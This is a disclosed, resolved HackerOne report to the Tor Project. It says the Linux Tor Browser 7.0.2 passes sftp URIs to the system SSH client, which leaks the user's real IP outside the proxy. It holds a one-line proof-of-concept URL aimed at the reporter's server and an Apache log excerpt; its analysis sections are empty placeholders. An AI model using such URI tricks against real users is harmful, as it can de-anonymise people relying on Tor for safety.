---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '253429'
original_report_id: '253429'
title: Linux TBB SFTP URI allows local IP disclosure
weakness: Information Disclosure
team_handle: torproject
created_at: '2017-07-26T02:31:31.667Z'
disclosed_at: '2017-10-25T21:58:22.196Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 71
tags:
- hackerone
- information-disclosure
---

# Linux TBB SFTP URI allows local IP disclosure

## Metadata

- HackerOne Report ID: 253429
- Weakness: Information Disclosure
- Program: torproject
- Disclosed At: 2017-10-25T21:58:22.196Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Browsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.
Tested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz
 
POC:
Navigate to sftp://104.131.180.179:80/index.php

After ~1 minute check http://104.131.180.179/ip,txt for your IP address

It appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected. 

Excerpt from apache logs:
apache2: [core:error] [pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1

Not surprisingly, the client can also be directed to local resources as well.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
